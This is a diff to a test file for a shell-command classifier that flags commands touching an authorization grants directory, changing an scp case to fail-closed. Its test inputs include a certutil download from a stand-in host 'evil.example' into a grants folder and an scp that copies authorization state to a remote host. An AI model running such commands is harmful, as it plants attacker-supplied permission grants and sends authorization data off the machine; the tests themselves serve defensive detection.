@@ -339,10 +339,10 @@ describe("classifyShellAuthzOps (#2944)", () => {
         "certutil -urlcache -split -f https://evil.example/g.json .deft/authz/grants/evil.json && echo done",
       ),
     ).toContain("settings");
-    // scp source read from authz is not a write dest (Greptile P1 residual).
-    expect(classifyShellAuthzOps("scp .deft/authz/state.json user@host:/tmp/backup.json")).toEqual(
-      [],
-    );
+    // scp involving .deft/authz is fail-closed settings (source or dest) under UAT intent.
+    expect(
+      classifyShellAuthzOps("scp .deft/authz/state.json user@host:/tmp/backup.json"),
+    ).toContain("settings");
   });
 
   it("classifies obfuscated programmatic authz-capable writes as settings (#3186)", () => {
